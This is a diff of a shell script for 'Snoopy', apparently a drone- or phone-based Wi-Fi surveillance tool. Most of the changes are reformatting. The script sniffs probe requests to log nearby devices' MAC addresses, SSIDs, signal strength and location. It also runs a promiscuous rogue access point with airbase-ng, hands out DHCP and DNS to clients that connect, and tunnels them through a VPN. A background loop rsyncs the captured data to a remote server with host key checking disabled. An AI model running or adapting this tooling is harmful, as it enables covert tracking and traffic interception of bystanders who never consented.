@@ -33,46 +33,46 @@ d_pid=313373133
 s_pid=313373133
 
 function rogue_sniff_hdr {
-clear
-echo -e "
-+----------------------------------------------------------+
- 	Snoopy Rogue Access Point and Probe Sniffer
- +Interface: $iface
- +SSID: $ssid ($mode)
- +DeviceID: $device_id
- +VPN tunnel/sync server: $sync_server
- +Date: `date`
-+----------------------------------------------------------+
-"
-check_tubes
+    clear
+    echo -e "
+    +----------------------------------------------------------+
+    Snoopy Rogue Access Point and Probe Sniffer
+    +Interface: $iface
+    +SSID: $ssid ($mode)
+    +DeviceID: $device_id
+    +VPN tunnel/sync server: $sync_server
+    +Date: `date`
+    +----------------------------------------------------------+
+    "
+    check_tubes
 }
 
 function start_rogue_ap_hdr {
-clear
-mode="Promiscuous"
-if [ "$promisc" != "true" ]; then mode="Non-promiscuous"; fi
+    clear
+    mode="Promiscuous"
+    if [ "$promisc" != "true" ]; then mode="Non-promiscuous"; fi
 
-echo -e "
-+----------------------------------------------------------+
- 		Snoopy Rogue Access Point.
- +Interface: $iface
- +SSID: $ssid ($mode)
- +DeviceID: $device_id
- +VPN tunnel server: $sync_server
- +Date: `date`
-+----------------------------------------------------------+
-"
-check_tubes
+    echo -e "
+    +----------------------------------------------------------+
+    Snoopy Rogue Access Point.
+    +Interface: $iface
+    +SSID: $ssid ($mode)
+    +DeviceID: $device_id
+    +VPN tunnel server: $sync_server
+    +Date: `date`
+    +----------------------------------------------------------+
+    "
+    check_tubes
 }
 
 function run_probe_sniffer_hdr {
 clear
 echo -e "
 +----------------------------------------------------------+
- 		Snoopy Probe Sniffer.
- +DeviceID: $device_id
- +SyncServer: $sync_server
- +Date: `date`
+Snoopy Probe Sniffer.
++DeviceID: $device_id
++SyncServer: $sync_server
++Date: `date`
 +----------------------------------------------------------+
 "
 echo "[+] Checking Drone's internet connectivity..."
@@ -90,12 +90,12 @@ n900_sniff(){
 	tshark -b filesize:512 -b files:1 -w ~/.tmp/probes -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |/usr/bin/gnu/sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
 	t_pid=$!
 }
+
 linux_sniff(){
 	# Here remove the -q that removes all logs?!
 	tshark -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
 	t_pid=$!
 }
-
 
 function run_probe_sniffer {
 	if [ -z $location ]; then
@@ -104,7 +104,7 @@ function run_probe_sniffer {
 	fi
 
 	mkdir -p ~/.tmp/
-	run_id=`date +%s`"_"$RANDOM
+	run_id="`date +%s`_$RANDOM"
 	while [ -r /tmp/snoopy_go ]
 	do
         	echo "[*] Starting probe sniffer..."
@@ -116,82 +116,80 @@ function run_probe_sniffer {
 }
 
 function run_probe_sniffer_old {
+    if [ -z $location ]; then
+        echo -n "[-] Enter description (e.g.location): "
+            read location
+    fi
 
-if [ -z $location ]; then
-	echo -n "[-] Enter description (e.g.location): "
-        read location
-fi
+    echo "[*] Starting probe sniffer..."
+    run_id=`date +%s`"_"$RANDOM
+    #echo [+] Local data will be saved to $save_path
+    #echo [+] Remote data will be uploaded to $upload_path/$device_id
+    mkdir -p ~/.tmp/
 
-echo "[*] Starting probe sniffer..."
-run_id=`date +%s`"_"$RANDOM
-#echo [+] Local data will be saved to $save_path
-#echo [+] Remote data will be uploaded to $upload_path/$device_id
-mkdir -p ~/.tmp/
+    if [[ "$arch" == "n900" ]]; then
+                    tshark -b filesize:512 -b files:1 -w ~/.tmp/probes -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |/usr/bin/gnu/sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
 
-if [[ "$arch" == "n900" ]]; then
-                tshark -b filesize:512 -b files:1 -w ~/.tmp/probes -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |/usr/bin/gnu/sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
+            elif [[ "$arch" == "linux" ]]; then
 
-        elif [[ "$arch" == "linux" ]]; then
-
-                tshark -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
-        fi
-        t_pid=$!
-	echo "[+] Client probe requests can be viewed via 'tail -f $save_path/probe_data.txt'"
+                    tshark -S -l -i $iface -R 'wlan.fc.type_subtype eq 4' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal -e frame.time -E separator=, -E quote=d |sed -u "s/^/\"$device_id\",\"$run_id\",\"$location\",/" >> $save_path/probe_data.txt &
+            fi
+            t_pid=$!
+        echo "[+] Client probe requests can be viewed via 'tail -f $save_path/probe_data.txt'"
 }
 
 function start_rogue_ap {
+    echo [+] Flushing iptables
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
 
-echo [+] Flushing iptables
-iptables --flush
-iptables --table nat --flush
-iptables --delete-chain
-iptables --table nat --delete-chain
+    # Bug when connecting over 3G on N900
+    if [ "$arch" == "n900" ]; then
+            echo "nameserver 8.8.8.8" > /var/run/resolv.conf.gprs
+    fi
+    echo "nameserver 8.8.8.8" > /etc/resolv.conf
 
-# Bug when connecting over 3G on N900
-if [ "$arch" == "n900" ]; then
-        echo "nameserver 8.8.8.8" > /var/run/resolv.conf.gprs
-fi
-echo "nameserver 8.8.8.8" > /etc/resolv.conf
+    echo [+] Bringing up VPN...
+    openvpn --cd $snoopyDir/configs/openvpn/ --config openvpn.conf >> $save_path/vpn.log 2>&1  &
+    o_pid=$!
+    #/usr/bin/osso-xterm -e "sudo openvpn --cd $snoopy_path/configs/openvpn/ --config openvpn.conf"
 
-echo [+] Bringing up VPN...
-openvpn --cd $snoopyDir/configs/openvpn/ --config openvpn.conf >> $save_path/vpn.log 2>&1  &
-o_pid=$!
-#/usr/bin/osso-xterm -e "sudo openvpn --cd $snoopy_path/configs/openvpn/ --config openvpn.conf"
+    until ifconfig | grep -q "tap0"; do sleep 2; done
+    echo [+] VPN interface seems to be up. Checking connectivity..
+    until ping -c 1 192.168.23.1>/dev/null; do sleep 3; done
+    echo [+] Connectivity to VPN server connection is savy. Testing Internet via VPN..
+    until ping -c 1 8.8.8.8>/dev/null; do sleep 3; done
+    echo [+] Connectivity beyond VPN server connection is savy. Let\'s rock.
 
-until ifconfig | grep -q "tap0"; do sleep 2; done
-echo [+] VPN interface seems to be up. Checking connectivity..
-until ping -c 1 192.168.23.1>/dev/null; do sleep 3; done
-echo [+] Connectivity to VPN server connection is savy. Testing Internet via VPN..
-until ping -c 1 8.8.8.8>/dev/null; do sleep 3; done
-echo [+] Connectivity beyond VPN server connection is savy. Let\'s rock.
+    sleep 1
 
-sleep 1
+    echo [+] Starting rogue AP..
+    ra_cmd="airbase-ng -P -C 30 -c 3 -e $ssid $iface"
+    if [ "$promisc" != "true" ]; then
+            ra_cmd="airbase-ng -c 3 -e $ssid $iface"
+    fi
 
-echo [+] Starting rogue AP..
-ra_cmd="airbase-ng -P -C 30 -c 3 -e $ssid $iface"
-if [ "$promisc" != "true" ]; then
-        ra_cmd="airbase-ng -c 3 -e $ssid $iface"
-fi
+    echo "#-------------------------------------------------#" >> $save_path/rogueap.log
+    echo "# Rogue AP running `date`                         " >> $save_path/rogueap.log
+    echo "#-------------------------------------------------#" >> $save_path/rogueap.log
+    $ra_cmd >> $save_path/rogueap.log 2>&1 &
+    r_pid=$!
 
-echo "#-------------------------------------------------#" >> $save_path/rogueap.log
-echo "# Rogue AP running `date`                         " >> $save_path/rogueap.log
-echo "#-------------------------------------------------#" >> $save_path/rogueap.log
-$ra_cmd >> $save_path/rogueap.log 2>&1 &
-r_pid=$!
+    if [ "$arch" == "n900" ]; then
+            echo "[+] Tailing rogue AP logs in new window.."
+            /usr/bin/osso-xterm -e "tail -f $save_path/rogueap.log" &
+    else
+            echo "[+] Associated client logs can be seen via 'tail -f $save_path/rogueap.log'"
+    fi
 
-if [ "$arch" == "n900" ]; then
-        echo "[+] Tailing rogue AP logs in new window.."
-        /usr/bin/osso-xterm -e "tail -f $save_path/rogueap.log" &
-else
-        echo "[+] Associated client logs can be seen via 'tail -f $save_path/rogueap.log'"
-fi
-
-until ifconfig -a| grep -q "at0"; do sleep 1; done
-sleep 2
-ifconfig at0 up $at0_ip netmask 255.255.0.0
-until ifconfig | grep -q "at0"; do sleep 1; done
-echo "1" > /proc/sys/net/ipv4/ip_forward
-echo [+] Rogue AP interface is up.
+    until ifconfig -a| grep -q "at0"; do sleep 1; done
+    sleep 2
+    ifconfig at0 up $at0_ip netmask 255.255.0.0
+    until ifconfig | grep -q "at0"; do sleep 1; done
+    echo "1" > /proc/sys/net/ipv4/ip_forward
+    echo [+] Rogue AP interface is up.
 
 #Rewrite the config file because of unknown $snoopy_store on server side
 cat > $snoopyDir/configs/dnsmasq.conf << EOL
@@ -201,12 +199,12 @@ dhcp-option=6,$vpn_tap_ip
 dhcp-leasefile=$save_path/dhcpd.leases
 EOL
 
-echo [+] Starting DHCP server for rogue AP...
-#dhcp-helper -b tap0 #Help me compile support for N900?
+    echo [+] Starting DHCP server for rogue AP...
+    #dhcp-helper -b tap0 #Help me compile support for N900?
 
-until ! [ "$(pidof dnsmasq)" ]; do killall dnsmasq; done
-dnsmasq -a $at0_ip -i at0 -C $snoopyDir/configs/dnsmasq.conf
-d_pid=$!
+    until ! [ "$(pidof dnsmasq)" ]; do killall dnsmasq; done
+    dnsmasq -a $at0_ip -i at0 -C $snoopyDir/configs/dnsmasq.conf
+    d_pid=$!
 }
 
 function gps_logger {
@@ -413,7 +411,10 @@ function sync {
 
 	# Backgrounded
 	# Will including $snoopyDir variable disable ability to specify absolute commands restricting rsync?
-	while [ -r /tmp/snoopy_go ]; do rsync -e "ssh -i $key -o StrictHostKeyChecking=no" -rzt $snoopyDir/snoopy_data/ $sync_user@$sync_server:$upload_path &> /dev/null; sleep $delay_between_syncs; done &
+	while [ -r /tmp/snoopy_go ]; do
+        rsync -e "ssh -i $key -o StrictHostKeyChecking=no" -rzt $snoopyDir/snoopy_data/ $sync_user@$sync_server:$upload_path &> /dev/null
+        sleep $delay_between_syncs
+    done &
 	s_pid=$!
 }
 
@@ -432,7 +433,7 @@ function run_stuff {
 	if [ "$rogue" -eq "1" ] && [ "$probe" -eq "1" ]; then
 		rogue_sniff_hdr
 		injection_on
-                start_rogue_ap
+        start_rogue_ap
 		run_probe_sniffer
 		gps_logger
 
